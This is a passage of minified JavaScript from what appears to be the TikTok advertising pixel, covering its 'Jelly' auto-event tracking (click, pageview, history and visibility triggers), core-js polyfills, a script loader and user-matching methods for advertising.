      }, S.prototype.history_change = function (t, e, n) {
        var r;
        switch (t) {
          case "NEW_HISTORY_FRAGMENT":
            r = location.hash;
            break;
          case "OLD_HISTORY_FRAGMENT":
            r = n.old_hash;
            break;
          case "NEW_HISTORY_STATE":
            r = history.state;
            break;
          case "OLD_HISTORY_STATE":
            r = n.old_state;
            break;
          case "HISTORY_SOURCE":
            r = e.type;
            break;
          default:
            r = null;
        }
        return r;
      }, S.prototype.visibility = function (t, e, n) {
        var r;
        switch (void 0 === n && (n = document), t) {
          case "ELEMENT_ID":
            r = "#" + e;
            break;
          case "ELEMENT_CLASS":
            r = "." + e;
            break;
          case "ELEMENT":
            r = e;
            break;
          default:
            r = null;
        }
        return n.querySelector(r);
      }, S);
    function S() {}
    var P,
      T,
      A,
      j,
      r = n("cpc2"),
      n = n.n(r),
      r = (P = function (t, e) {
        return (P = Object.setPrototypeOf || {
          __proto__: []
        } instanceof Array && function (t, e) {
          t.__proto__ = e;
        } || function (t, e) {
          for (var n in e) e.hasOwnProperty(n) && (t[n] = e[n]);
        })(t, e);
      }, function (t, e) {
        function n() {
          this.constructor = t;
        }
        P(t, e), t.prototype = null === e ? Object.create(e) : (n.prototype = e.prototype, new n());
      }),
      N = (T = n.a, r(k, T), k.prototype.sendDebugEvent = function (t, e, n) {
        var r = this.BaseConf,
          o = [];
        r.forEach(function (t) {
          t.code_id == e && (t.conditions = n), o.push(t);
        });
        t = {
          sdk_id: this.SDK_ID,
          event_name: t,
          data: o
        };
        this.emit("jelly_message", t);
      }, k);
    function k(t, e) {
      var n = T.call(this) || this;
      return n.BaseConf = t, n.SDK_ID = e, n.BaseConf.forEach(function (t) {
        t.id = t.code_id, t.conditions = t.conditions || [], t.conditions.forEach(function (t) {
          t.result = !1;
        });
      }), n;
    }
    (r = A = A || {})[r.WRONG = -1] = "WRONG", r[r.KEEP = 0] = "KEEP", r[r.ARRAY = -2] = "ARRAY", r[r.TURNINTOINTEGER = 1] = "TURNINTOINTEGER", r[r.TURNINTODECIMAL = 2] = "TURNINTODECIMAL", (r = j = j || {})[r.CLICK_EVENT = 0] = "CLICK_EVENT", r[r.DESTINATION_URL = 1] = "DESTINATION_URL";
    var R,
      M,
      C = function (t, e, n) {
        var r;
        return -1 === e || void 0 === e ? void 0 !== (r = D(t)[0]) ? L(r, n) : "" : void 0 !== (r = D(t)[e]) ? L(r, n) : "";
      },
      L = function (t, e) {
        var n,
          r,
          o = "";
        return e !== A.KEEP && e !== A.WRONG || (o = t), e === A.TURNINTOINTEGER && (o = t.replace(/[,\.]/g, "")), e === A.TURNINTODECIMAL && (n = t.split(/[,\.]/g), r = "", n.forEach(function (t, e) {
          e < n.length - 1 ? r += t : r += "." + t;
        }), o = r), o;
      },
      D = function (t) {
        for (var e, n = /[\d|\.|,]+/gm, r = []; null !== (e = n.exec(t));) e.index === n.lastIndex && n.lastIndex++, e.forEach(function (t) {
          r.push(t);
        });
        return r;
      },
      r = (R = function (t, e) {
        return (R = Object.setPrototypeOf || {
          __proto__: []
        } instanceof Array && function (t, e) {
          t.__proto__ = e;
        } || function (t, e) {
          for (var n in e) e.hasOwnProperty(n) && (t[n] = e[n]);
        })(t, e);
      }, function (t, e) {
        function n() {
          this.constructor = t;
        }
        R(t, e), t.prototype = null === e ? Object.create(e) : (n.prototype = e.prototype, new n());
      }),
      F = function (t) {
        var e = "function" == typeof Symbol && Symbol.iterator,
          n = e && t[e],
          r = 0;
        if (n) return n.call(t);
        if (t && "number" == typeof t.length) return {
          next: function () {
            return {
              value: (t = t && r >= t.length ? void 0 : t) && t[r++],
              done: !t
            };
          }
        };
        throw new TypeError(e ? "Object is not iterable." : "Symbol.iterator is not defined.");
      },
      B = new m(),
      U = (M = n.a, r(V, M), V.prototype.dispatcher = function (t, e, n, r) {
        var o, i, a, c;
        if (e) try {
          for (var u = F(e), s = u.next(); !s.done; s = u.next()) {
            var f = s.value,
              l = [];
            try {
              for (var p = (a = void 0, F(f.conditions)), h = p.next(); !h.done; h = p.next()) {
                var d = h.value,
                  v = B.dispatcher(t, d, n, r),
                  y = x(v, d.operator, d.value, d.variable_type);
                if (y = "history_change" === t || "pageview" === t ? y || x(function (e) {
                  var n = e;
                  if ("string" == typeof e) try {
                    n = decodeURI(e);
                  } catch (t) {
                    n = e;
                  }
                  return n;
                }(v), d.operator, d.value, d.variable_type) : y) {
                  var b = !1;
                  try {
                    b = "ELEMENT" === (null == d ? void 0 : d.variable_type) && Object(_.x)(v);
                  } catch (t) {
                    b = !1, Object(O.a)(E.a.CUSTOM_ERROR, t, {
                      custom_name: "button_check_jelly_error",
                      custom_enum: "auto_click",
                      extJSON: {
                        element: v
                      }
                    });
                  }
                  var g = function (e) {
                    try {
                      var t = e.split(w);
                      return t[0] + w + ',"is_standard_mode":"1"' + t[1];
                    } catch (t) {
                      return e;
                    }
                  }(g = function (e, t) {
                    try {
                      var n = e.split(w),
                        r = "";
                      return t && (r += ',"is_button":"true"'), r ? n[0] + w + r + n[1] : e;
                    } catch (t) {
                      return e;
                    }
                  }(f.code, b));
                  if (d.dynamic_parameter) try {
                    var m = function (e, n, t) {
                      try {
                        var r = e.split(w),
                          o = "";
                        return Object.keys(n).forEach(function (t) {
                          null === n[t] && void 0 === n[t] || (o += ',"' + t + '":"' + ("value" !== t ? encodeURIComponent(n[t]) : n[t]) + '"');
                        }), t && (o += ',"dynamic_parameter_config":' + JSON.stringify(t)), o ? r[0] + w + o + r[1] : e;
                      } catch (t) {
                        return e;
                      }
                    }(g, function (t) {
                      var e,
                        n,
                        r,
                        o,
                        i,
                        a,
                        c,
                        u = {};
                      try {
                        return t.currency && (u.currency = t.currency), t.value && (document.querySelectorAll(t.value).length, null != (n = document.querySelector(t.value)) && n.innerHTML && (u.ori_value = n.innerHTML, u.value = C(null === (e = n.innerHTML) || void 0 === e ? void 0 : e.trim(), t.value_index, t.value_parsing_method))), t.contents && void 0 !== t.contents[0].content_type && (u.content_type = t.contents[0].content_type), t.contents && t.contents[0].content_name && (n = document.querySelector(t.contents[0].content_name), u.content_name = null == n ? void 0 : n.innerHTML), t.contents && t.contents[0].content_id && (t.contents[0].content_from === j.CLICK_EVENT ? (n = document.querySelector(t.contents[0].content_id), u.content_id = null == n ? void 0 : n.innerHTML) : t.contents[0].content_from === j.DESTINATION_URL && (r = new URL(location.href), t.contents[0].content_id.startsWith("path") && (o = r.pathname.split("/"), i = t.contents[0].content_id.split("|")[1], u.content_id = o[i]), t.contents[0].content_id.startsWith("search") && (a = new URLSearchParams(r.search), c = t.contents[0].content_id.split("|")[1], u.content_id = a.get(c)))), u;
                      } catch (t) {
                        return u;
                      }
                    }(d.dynamic_parameter), d.dynamic_parameter);
                    I(m);
                  } catch (t) {
                    I(g);
                  } else I(g);
                  this.SendEvent.sendDebugEvent("jelly." + t, f.code_id, l);
                }
                l.push(Object.assign(d, {
                  cur_value: v,
                  result: y
                }));
              }
            } catch (t) {
              a = {
                error: t
              };
            } finally {
              try {
                h && !h.done && (c = p.return) && c.call(p);
              } finally {
                if (a) throw a.error;
              }
            }
          }
        } catch (t) {
          o = {
            error: t
          };
        } finally {
          try {
            s && !s.done && (i = u.return) && i.call(u);
          } finally {
            if (o) throw o.error;
          }
        }
      }, V.prototype.click = function () {
        var e = this;
        a(function (t) {
          e.dispatcher("click", e.CLICK, t);
        }, !0);
      }, V.prototype.pageview = function () {
        this.dispatcher("pageview", this.PAGEVIEW), this.history_change(this.PAGEVIEW);
      }, V.prototype.history_change = function (e) {
        void 0 === e && (e = this.HISTORY_CHANGE);
        var t,
          n = this,
          r = history.state,
          o = location.hash,
          i = location.href;
        t = this.SDK_ID, history.pushState = v("pushState", t), history.replaceState = v("replaceState", t), window.addEventListener("pushState-" + this.SDK_ID, function (t) {
          location.href != i && (n.dispatcher("history_change", e, t, {
            old_state: r
          }), r = history.state, i = location.href);
        }), window.addEventListener("replaceState-" + this.SDK_ID, function () {
          location.href != i && (n.dispatcher("history_change", e, {
            old_state: r
          }), r = history.state, i = location.href);
        }), window.addEventListener("popstate", function (t) {
          location.href != i && (n.dispatcher("history_change", e, t, {
            old_hash: o
          }), o = location.hash, i = location.href);
        });
      }, V.prototype.visibility = function () {
        if (!(this.VISIBILITY.length < 1)) {
          var t = this.VISIBILITY,
            e = this.SendEvent.sendDebugEvent.bind(this.SendEvent);
          new MutationObserver(Y(t, e, window)).observe(document, {
            childList: !0,
            characterData: !0,
            subtree: !0,
            attributes: !0
          });
          for (var n = document.getElementsByTagName("iframe"), r = 0; r < n.length; r++) try {
            var o = n[r].contentWindow;
            null != o && new MutationObserver(Y(t, e, o)).observe(o.document, {
              childList: !0,
              characterData: !0,
              subtree: !0,
              attributes: !0
            });
          } catch (t) {}
        }
      }, V);
    function V(t, e, n, r) {
      var o = M.call(this) || this;
      return o.on("jelly_message", r), o.SendEvent = new N(e, n), o.SendEvent.on("jelly_message", function (t) {
        o.emit("jelly_message", t);
      }), o.CLICK = t.CLICK || [], o.PAGEVIEW = t.PAGEVIEW || [], o.VISIBILITY = t.VISIBILITY || [], o.HISTORY_CHANGE = t.HISTORY_CHANGE || [], o.SDK_ID = n || "", o.click(), o.pageview(), o.visibility(), o;
    }
    var J,
      H,
      Y = function (t, f, i) {
        void 0 === i && (i = window);
        var a = {};
        return function () {
          t.forEach(function (c) {
            var u = !0,
              o = [],
              s = [];
            c.conditions.forEach(function (t) {
              var e, n, r;
              -1 < g.visibility.indexOf(t.variable_type) ? (n = "", e = B.dispatcher("visibility", t, null, null, i.document), r = "_" + t.value, e && function (t, e) {
                e = t.getComputedStyle(e);
                return "none" !== e.display && "visible" === e.visibility && !(Number(e.opacity) < .1);
              }(i, e) && !a[r] && (o.push(d(e, n, t)), a[r] = !0)) : (n = B.dispatcher("visibility", t), (r = x(n, t.operator, t.value, t.variable_type)) || (u = !1), s.push(Object.assign(t, {
                cur_value: n,
                result: r
              })));
            }), 0 < o.length && Promise.all(o).then(function (t) {
              var e,
                n,
                r = !0;
              try {
                for (var o = F(t), i = o.next(); !i.done; i = o.next()) {
                  var a = i.value;
                  s.push(Object.assign(a.condition, {
                    cur_value: a.curValue,
                    result: a.result
                  })), a.result && u || (r = !1);
                }
              } catch (t) {
                e = {
                  error: t
                };
              } finally {
                try {
                  i && !i.done && (n = o.return) && n.call(o);
                } finally {
                  if (e) throw e.error;
                }
              }
              r && I(c.code), f("jelly.visibility", c.code_id, s);
            }, function () {});
          });
        };
      },
      r = (J = function (t, e) {
        return (J = Object.setPrototypeOf || {
          __proto__: []
        } instanceof Array && function (t, e) {
          t.__proto__ = e;
        } || function (t, e) {
          for (var n in e) e.hasOwnProperty(n) && (t[n] = e[n]);
        })(t, e);
      }, function (t, e) {
        function n() {
          this.constructor = t;
        }
        J(t, e), t.prototype = null === e ? Object.create(e) : (n.prototype = e.prototype, new n());
      }),
      r = (H = n.a, r(G, H), G.prototype.dispatch = function () {
        var n = {
          CLICK: [],
          PAGEVIEW: [],
          VISIBILITY: [],
          HISTORY_CHANGE: []
        };
        return this.BaseConf.forEach(function (t) {
          var e = {
            code_id: t.code_id,
            code: t.code,
            conditions: t.conditions || []
          };
          n[t.trigger_type] && n[t.trigger_type].push(e);
        }), n;
      }, G);
    function G(t, e) {
      var n = H.call(this) || this;
      if (n.BaseConf = e, n.SDK_ID = t, window.jelly_tool_events && window.jelly_tool_events.length && window.jelly_tool_events.forEach(function (t) {
        n.on(t.name, t.callback);
      }), n.emit("jelly_event", {
        SDK_ID: t,
        BaseConf: e || []
      }), n.BaseConf instanceof Array) {
        if (self._jelly_sdks = self._jelly_sdks || {}, self._jelly_sdks[t]) return n;
        self._jelly_sdks[t] = !0;
        var r = n.dispatch();
        n.trigger = new U(r, e, t, function (t) {
          n.emit("jelly_message", t);
        });
      }
      return n;
    }
    e.default = r;
    window.TiktokJelly = r;
  },
  gjK9: function (t, e, n) {
    var o = n("PpLa")("iterator"),
      i = !1;
    try {
      var r = 0,
        a = {
          next: function () {
            return {
              done: !!r++
            };
          },
          return: function () {
            i = !0;
          }
        };
      a[o] = function () {
        return this;
      }, Array.from(a, function () {
        throw 2;
      });
    } catch (t) {}
    t.exports = function (t, e) {
      if (!e && !i) return !1;
      var n = !1;
      try {
        var r = {};
        r[o] = function () {
          return {
            next: function () {
              return {
                done: n = !0
              };
            }
          };
        }, t(r);
      } catch (t) {}
      return n;
    };
  },
  gsVl: function (t, e, n) {
    var r = n("tNbY"),
      o = n("j3DO"),
      i = n("g2s6"),
      a = n("nY95"),
      c = n("9Zby").onFreeze,
      u = Object.freeze;
    r({
      target: "Object",
      stat: !0,
      forced: i(function () {
        u(1);
      }),
      sham: !o
    }, {
      freeze: function (t) {
        return u && a(t) ? u(c(t)) : t;
      }
    });
  },
  hBnJ: function (t, e, n) {
    var r = n("YAV1");
    t.exports = function (t) {
      if (!r(t)) throw TypeError(String(t) + " is not an object");
      return t;
    };
  },
  hYRU: function (t, e, n) {
    n = n("g2s6");
    t.exports = !n(function () {
      return 7 != Object.defineProperty({}, 1, {
        get: function () {
          return 7;
        }
      })[1];
    });
  },
  iBW0: function (t, e) {
    t.exports = {};
  },
  iGP5: function (t, e, n) {
    n = n("g2s6");
    t.exports = !n(function () {
      function t() {}
      return t.prototype.constructor = null, Object.getPrototypeOf(new t()) !== t.prototype;
    });
  },
  iKAX: function (t, e, n) {
    var r = n("j16E"),
      n = n("ARxZ"),
      r = r.WeakMap;
    t.exports = "function" == typeof r && /native code/.test(n(r));
  },
  ijL2: function (t, e, n) {
    "use strict";

    var r = n("BMm0"),
      o = n("pAXd"),
      i = n("Kshg"),
      a = n("Xy12"),
      c = n("BxeX"),
      u = n("zr9T");
    o && r({
      target: "Object",
      proto: !0,
      forced: i
    }, {
      __defineGetter__: function (t, e) {
        u.f(a(this), t, {
          get: c(e),
          enumerable: !0,
          configurable: !0
        });
      }
    });
  },
  ilFY: function (t, e, n) {
    var r = n("lWKF"),
      n = n("j16E");
    t.exports = "process" == r(n.process);
  },
  j16E: function (n, t, e) {
    !function (t) {
      function e(t) {
        return t && t.Math == Math && t;
      }
      n.exports = e("object" == typeof globalThis && globalThis) || e("object" == typeof window && window) || e("object" == typeof self && self) || e("object" == typeof t && t) || function () {
        return this;
      }() || Function("return this")();
    }.call(this, e("yLpj"));
  },
  j3DO: function (t, e, n) {
    n = n("g2s6");
    t.exports = !n(function () {
      return Object.isExtensible(Object.preventExtensions({}));
    });
  },
  "j7w+": function (t, e, n) {
    "use strict";

    var r = n("BMm0"),
      o = n("B4Mi"),
      i = n("VGpX"),
      a = n("17p4"),
      c = n("g03b"),
      u = n("KvEl"),
      s = n("JOA9"),
      f = function (t, e) {
        var n = this;
        if (!(n instanceof f)) return new f(t, e);
        i && (n = i(new Error(void 0), o(n))), void 0 !== e && c(n, "message", String(e));
        e = [];
        return s(t, e.push, {
          that: e
        }), c(n, "errors", e), n;
      };
    f.prototype = a(Error.prototype, {
      constructor: u(5, f),
      message: u(5, ""),
      name: u(5, "AggregateError")
    }), r({
      global: !0
    }, {
      AggregateError: f
    });
  },
  jg4D: function (t, e, n) {
    n("j7w+"), n("Fx+t"), n("ZOq6"), n("LYf5"), n("sT9Q"), n("XTFD"), n("+TZR"), n("dEdv");
    n = n("u15C");
    t.exports = n.Promise;
  },
  jk77: function (t, e, n) {
    var r = n("hYRU"),
      o = n("/XoZ"),
      i = n("uoAl"),
      a = n("5BnI"),
      c = Object.defineProperty;
    e.f = r ? c : function (t, e, n) {
      if (i(t), e = a(e, !0), i(n), o) try {
        return c(t, e, n);
      } catch (t) {}
      if ("get" in n || "set" in n) throw TypeError("Accessors not supported");
      return "value" in n && (t[e] = n.value), t;
    };
  },
  k3nE: function (t, e, n) {
    n = n("nJ5C");
    t.exports = /web0s(?!.*chrome)/i.test(n);
  },
  kXxx: function (t, e, n) {
    var r = n("t1hJ"),
      o = n("nGI6");
    t.exports = function (t) {
      return r(o(t));
    };
  },
  kYvf: function (t, e, n) {
    "use strict";

    var r = n("BMm0"),
      o = n("pAXd"),
      i = n("Kshg"),
      a = n("Xy12"),
      c = n("BxeX"),
      u = n("zr9T");
    o && r({
      target: "Object",
      proto: !0,
      forced: i
    }, {
      __defineSetter__: function (t, e) {
        u.f(a(this), t, {
          set: c(e),
          enumerable: !0,
          configurable: !0
        });
      }
    });
  },
  kr2p: function (t, e, n) {
    "use strict";

    var r = {}.propertyIsEnumerable,
      o = Object.getOwnPropertyDescriptor,
      i = o && !r.call({
        1: 2
      }, 1);
    e.f = i ? function (t) {
      t = o(this, t);
      return !!t && t.enumerable;
    } : r;
  },
  ksQn: function (t, e, n) {
    var i = n("BxeX");
    t.exports = function (r, o, t) {
      if (i(r), void 0 === o) return r;
      switch (t) {
        case 0:
          return function () {
            return r.call(o);
          };
        case 1:
          return function (t) {
            return r.call(o, t);
          };
        case 2:
          return function (t, e) {
            return r.call(o, t, e);
          };
        case 3:
          return function (t, e, n) {
            return r.call(o, t, e, n);
          };
      }
      return function () {
        return r.apply(o, arguments);
      };
    };
  },
  kuLf: function (t, e, n) {
    var r,
      o,
      i = n("5m5M"),
      n = n("nJ5C"),
      i = i.process,
      i = i && i.versions,
      i = i && i.v8;
    i ? o = (r = i.split("."))[0] + r[1] : n && (!(r = n.match(/Edge\/(\d+)/)) || 74 <= r[1]) && (r = n.match(/Chrome\/(\d+)/)) && (o = r[1]), t.exports = o && +o;
  },
  lPlc: function (t, e, n) {
    var r = n("8kmq"),
      o = n("OwQu"),
      i = n("PpLa")("iterator");
    t.exports = function (t) {
      if (null != t) return t[i] || t["@@iterator"] || o[r(t)];
    };
  },
  lWKF: function (t, e) {
    var n = {}.toString;
    t.exports = function (t) {
      return n.call(t).slice(8, -1);
    };
  },
  "lmP+": function (t, e) {
    var n = 0,
      r = Math.random();
    t.exports = function (t) {
      return "Symbol(" + String(void 0 === t ? "" : t) + ")_" + (++n + r).toString(36);
    };
  },
  mFs5: function (t, e, n) {
    "use strict";

    n.d(e, "c", function () {
      return r;
    }), n.d(e, "b", function () {
      return o;
    }), n.d(e, "a", function () {
      return i;
    });
    var r = ["phone_number", "email", "external_id"],
      o = {
        EMAIL_IS_HASHED: "email_is_hashed",
        PHONE_IS_HASHED: "phone_is_hashed",
        SHA256_EMAIL: "sha256_email",
        SHA256_PHONE: "sha256_phone"
      },
      i = "auto_trigger_type";
  },
  mRBh: function (t, e, n) {
    var r = n("j16E"),
      o = n("Thaq"),
      i = n("edxO"),
      a = n("L5Il"),
      c = n("ByEr"),
      n = n("Vi/0"),
      u = o("wks"),
      s = r.Symbol,
      f = n ? s : s && s.withoutSetter || a;
    t.exports = function (t) {
      return i(u, t) && (c || "string" == typeof u[t]) || (c && i(s, t) ? u[t] = s[t] : u[t] = f("Symbol." + t)), u[t];
    };
  },
  mb4w: function (t, e) {
    t.exports = function (t) {
      if ("function" != typeof t) throw TypeError(String(t) + " is not a function");
      return t;
    };
  },
  "mhS+": function (t, e, n) {
    var r = n("5m5M"),
      n = n("YAV1"),
      o = r.document,
      i = n(o) && n(o.createElement);
    t.exports = function (t) {
      return i ? o.createElement(t) : {};
    };
  },
  mx8G: function (t, e) {
    e.f = Object.getOwnPropertySymbols;
  },
  mzWg: function (t, e) {
    t.exports = ["constructor", "hasOwnProperty", "isPrototypeOf", "propertyIsEnumerable", "toLocaleString", "toString", "valueOf"];
  },
  nFr6: function (t, e, n) {
    var r = n("BMm0"),
      o = n("TwxJ"),
      i = n("YAV1"),
      a = Object.isFrozen;
    r({
      target: "Object",
      stat: !0,
      forced: o(function () {
        a(1);
      })
    }, {
      isFrozen: function (t) {
        return !i(t) || !!a && a(t);
      }
    });
  },
  nGI6: function (t, e) {
    t.exports = function (t) {
      if (null == t) throw TypeError("Can't call method on " + t);
      return t;
    };
  },
  nJ5C: function (t, e, n) {
    n = n("0o+f");
    t.exports = n("navigator", "userAgent") || "";
  },
  nNtJ: function (t, e, n) {
    "use strict";

    var r = n("BMm0"),
      o = n("pAXd"),
      i = n("Kshg"),
      a = n("Xy12"),
      c = n("FUg4"),
      u = n("B4Mi"),
      s = n("0XV1").f;
    o && r({
      target: "Object",
      proto: !0,
      forced: i
    }, {
      __lookupSetter__: function (t) {
        var e,
          n = a(this),
          r = c(t, !0);
        do {
          if (e = s(n, r)) return e.set;
        } while (n = u(n));
      }
    });
  },
  nY95: function (t, e) {
    t.exports = function (t) {
      return "object" == typeof t ? null !== t : "function" == typeof t;
    };
  },
  ncq0: function (t, e) {
    t.exports = {};
  },
  npvp: function (t, e, n) {
    var r = n("jk77").f,
      o = n("edxO"),
      i = n("mRBh")("toStringTag");
    t.exports = function (t, e, n) {
      t && !o(t = n ? t : t.prototype, i) && r(t, i, {
        configurable: !0,
        value: e
      });
    };
  },
  nt9l: function (t, e) {
    t.exports = function (t, e, n) {
      if (!(t instanceof e)) throw TypeError("Incorrect " + (n ? n + " " : "") + "invocation");
      return t;
    };
  },
  nu0E: function (t, e, n) {
    var r = n("BMm0"),
      o = n("TwxJ"),
      i = n("Xy12"),
      a = n("B4Mi"),
      n = n("PZXZ");
    r({
      target: "Object",
      stat: !0,
      forced: o(function () {
        a(1);
      }),
      sham: !n
    }, {
      getPrototypeOf: function (t) {
        return a(i(t));
      }
    });
  },
  nzNk: function (t, e, n) {
    var r = n("pAXd"),
      o = n("TwxJ"),
      i = n("mhS+");
    t.exports = !r && !o(function () {
      return 7 != Object.defineProperty(i("div"), "a", {
        get: function () {
          return 7;
        }
      }).a;
    });
  },
  oYVP: function (t, e, n) {
    var r = n("Xy12"),
      o = {}.hasOwnProperty;
    t.exports = function (t, e) {
      return o.call(r(t), e);
    };
  },
  "oe+7": function (t, e, u) {
    "use strict";

    u.r(e);
    u("ya48");
    var v = u("SbFU");
    function n() {}
    var p,
      y,
      f = new (n.prototype.log = function () {
        for (var t = [], e = 0; e < arguments.length; e++) t[e] = arguments[e];
        t[0] = "[TT] " + t[0], this.console && this.console.log.apply(this.console, t);
      }, n.prototype.info = function () {
        for (var t = [], e = 0; e < arguments.length; e++) t[e] = arguments[e];
        this.group(t.shift() + "💡"), t.unshift("=>"), this.console && this.console.info.apply(this.console, t), this.groupEnd();
      }, n.prototype.warn = function () {
        for (var t = [], e = 0; e < arguments.length; e++) t[e] = arguments[e];
        t[0] = "[TT] " + t[0], this.console && this.console.warn.apply(this.console, t);
      }, n.prototype.error = function () {
        for (var t = [], e = 0; e < arguments.length; e++) t[e] = arguments[e];
        t[0] = "[TT] " + t[0], this.console && this.console.error.apply(this.console, t);
      }, n.prototype.group = function () {
        for (var t = [], e = 0; e < arguments.length; e++) t[e] = arguments[e];
        t[0] = "[TT] " + t[0], this.console && this.console.group.apply(this.console, t);
      }, n.prototype.groupEnd = function () {
        this.console && this.console.groupEnd.apply(this.console, ["groupEnd"]);
      }, n)(),
      r = function (t, a, c, u) {
        return new (c = c || Promise)(function (n, e) {
          function r(t) {
            try {
              i(u.next(t));
            } catch (t) {
              e(t);
            }
          }
          function o(t) {
            try {
              i(u.throw(t));
            } catch (t) {
              e(t);
            }
          }
          function i(t) {
            var e;
            t.done ? n(t.value) : ((e = t.value) instanceof c ? e : new c(function (t) {
              t(e);
            })).then(r, o);
          }
          i((u = u.apply(t, a || [])).next());
        });
      },
      o = function (n, r) {
        var o,
          i,
          a,
          c = {
            label: 0,
            sent: function () {
              if (1 & a[0]) throw a[1];
              return a[1];
            },
            trys: [],
            ops: []
          },
          t = {
            next: e(0),
            throw: e(1),
            return: e(2)
          };
        return "function" == typeof Symbol && (t[Symbol.iterator] = function () {
          return this;
        }), t;
        function e(e) {
          return function (t) {
            return function (e) {
              if (o) throw new TypeError("Generator is already executing.");
              for (; c;) try {
                if (o = 1, i && (a = 2 & e[0] ? i.return : e[0] ? i.throw || ((a = i.return) && a.call(i), 0) : i.next) && !(a = a.call(i, e[1])).done) return a;
                switch (i = 0, (e = a ? [2 & e[0], a.value] : e)[0]) {
                  case 0:
                  case 1:
                    a = e;
                    break;
                  case 4:
                    return c.label++, {
                      value: e[1],
                      done: !1
                    };
                  case 5:
                    c.label++, i = e[1], e = [0];
                    continue;
                  case 7:
                    e = c.ops.pop(), c.trys.pop();
                    continue;
                  default:
                    if (!(a = 0 < (a = c.trys).length && a[a.length - 1]) && (6 === e[0] || 2 === e[0])) {
                      c = 0;
                      continue;
                    }
                    if (3 === e[0] && (!a || e[1] > a[0] && e[1] < a[3])) {
                      c.label = e[1];
                      break;
                    }
                    if (6 === e[0] && c.label < a[1]) {
                      c.label = a[1], a = e;
                      break;
                    }
                    if (a && c.label < a[2]) {
                      c.label = a[2], c.ops.push(e);
                      break;
                    }
                    a[2] && c.ops.pop(), c.trys.pop();
                    continue;
                }
                e = r.call(n, c);
              } catch (t) {
                e = [6, t], i = 0;
              } finally {
                o = a = 0;
              }
              if (5 & e[0]) throw e[1];
              return {
                value: e[0] ? e[1] : void 0,
                done: !0
              };
            }([e, t]);
          };
        }
      },
      i = function (e, n) {
        return void 0 === n && (n = 1), r(this, void 0, void 0, function () {
          return o(this, function (t) {
            switch (t.label) {
              case 0:
                return [3, 1];
              case 1:
                if (!(0 <= n)) return [3, 6];
                t.label = 2;
              case 2:
                return t.trys.push([2, 4,, 5]), [4, (o = e, new Promise(function (t, e) {
                  var n = document.createElement("script");
                  n.type = "text/javascript", n.async = !0, n.src = o;
                  var r = document.getElementsByTagName("script")[0];
                  r && r.parentNode ? r.parentNode.insertBefore(n, r) : e("none element"), n.onload = function () {
                    t();
                  }, n.onerror = e;
                }))];
              case 3:
                return t.sent(), [2, Promise.resolve(!0)];
              case 4:
                return t.sent(), [2, i.call(null, e, n - 1)];
              case 5:
                return [3, 7];
              case 6:
                throw Error;
              case 7:
                return [2];
            }
            var o;
          });
        });
      };
    (O = p = p || {}).TRACK = "track", O.PERFORMANCE = "performance", O.PERFORMANCE_INTERACTION = "performance_interaction", O.INTERACTION = "interaction", O.PCM = "PCM", O.SELFHOST = "selfhost", O.AUTO_CONFIG = "auto_config", (e = y = y || {}).LDU = "limited_data_use", e.EVENTID = "eventID", e.EVENT_ID = "event_id";
    function c(n) {
      for (var r = [], t = 1; t < arguments.length; t++) r[t - 1] = arguments[t];
      try {
        var e = Object(v.n)() || [];
        e.context && e.context.plugins && e.context.plugins.forEach(function (e) {
          if ("function" == typeof e[n]) try {
            e[n].apply(e, r);
          } catch (t) {
            Object(h.a)(d.a.PLUGIN_ERROR, t, {
              extJSON: {
                plugin_name: e.name,
                cycle_name: n,
                data: r
              }
            });
          }
        });
      } catch (t) {}
    }
    var s,
      b = u("HyyX"),
      h = u("fe1q"),
      d = u("/6w+"),
      g = u("GJ6r"),
      a = u("w0s3");
    (O = s = s || {}).INIT_START = "initStart", O.INIT_END = "initEnd", O.CONTEXT_INIT_START = "contextInitStart", O.CONTEXT_INIT_END = "contextInitEnd", O.BEFORE_AD_INFO_INIT_START = "beforeAdInfoInitStart", O.AD_INFO_INIT_START = "adInfoInitStart", O.AD_INFO_INIT_END = "adInfoInitEnd", O.PLUGIN_INIT_START = "pluginInitStart", O.PLUGIN_INIT_END = "pluginInitEnd", O.PIXEL_CREATE_START = "pixelCreateStart", O.PIXEL_CREATE_END = "pixelCreateEnd", O.PIXEL_INIT_END = "pixelInitEnd", O.BEFORE_SHOPIFY_PIXEL_SEND = "beforeShopifyPixelSend", O.PIXEL_SEND = "pixelSend";
    l.prototype.setAdvancedMatchingAvailableProperties = function (t) {
      this.advancedMatchingAvailableProperties = Object.assign({}, this.advancedMatchingAvailableProperties, t);
    }, l.prototype.setPixelInfo = function (t, e, n) {
      t && (this.name = t.name, this.status = t.status, this.setupMode = t.setupMode, this.advertiserID = t.advertiserID, this.partner = t.partner, this.is_onsite = t.is_onsite), e && (this.rules = e), n && (this.plugins = n), c(s.PIXEL_INIT_END, this);
    }, l.prototype.getPixelInfo = function () {
      var t = this;
      return this.getInstance().then(function () {
        return {
          pixelCode: t.pixelCode,
          name: t.name,
          status: t.status,
          setupMode: t.setupMode,
          advertiserID: t.advertiserID,
          partner: t.partner,
          is_onsite: t.is_onsite,
          rules: t.rules,
          advancedMatchingAvailableProperties: t.advancedMatchingAvailableProperties
        };
      });
    }, l.prototype.getUserInfo = function (t) {
      var e = this.context.methods.getUserInfo(),
        n = Object(v.a)(e, Object.assign(this.advancedMatchingAvailableProperties));
      switch (t) {
        case b.h.Manual:
          return Object(v.a)(this.partner && "None" !== this.partner ? n : e, {
            external_id: !0,
            email: !0,
            phone_number: !0
          });
        case b.h.Auto:
          var r = Object(v.a)(n, {
            external_id: !0,
            auto_email: !0,
            auto_phone_number: !0
          });
          return Object.assign(r, (r.auto_email || r.auto_phone_number) && e.auto_trigger_type ? {
            auto_trigger_type: e.auto_trigger_type
          } : {});
        default:
          return n;
      }
    }, l.prototype.getPixelMatchedUserFormatInfo = function () {
      var t = this.context.methods.getUserFormatInfo(),
        e = Object(v.b)(t, this.partner && "None" !== this.partner ? this.advancedMatchingAvailableProperties : {
          external_id: !0,
          email: !0,
          phone_number: !0
        }),
        t = Object(v.a)(t, {
          auto_email: !0,
          auto_phone_number: !0
        });
      return 0 < Object.keys(t).length && Object.assign(e.identity_params, t), e;
    }, l.prototype.getPixelMatchedUserFormatInfoV2 = function () {
      var t = this.context.methods.getUserFormatInfoV2();
      return Object(v.c)(t, this.partner && "None" !== this.partner ? this.advancedMatchingAvailableProperties : {
        external_id: !0,
        email: !0,
        phone_number: !0
      });
    }, l.prototype.track = function (e, n, r) {
      var o = this;
      void 0 === r && (r = {}), this.getInstance().then(function () {
        Object(v.t)(o.pixelCode) && !r.eventID && (r = Object.assign({}, r, {
          eventID: Object(v.f)(Object(v.h)(a.c), o.pixelCode)
        }));
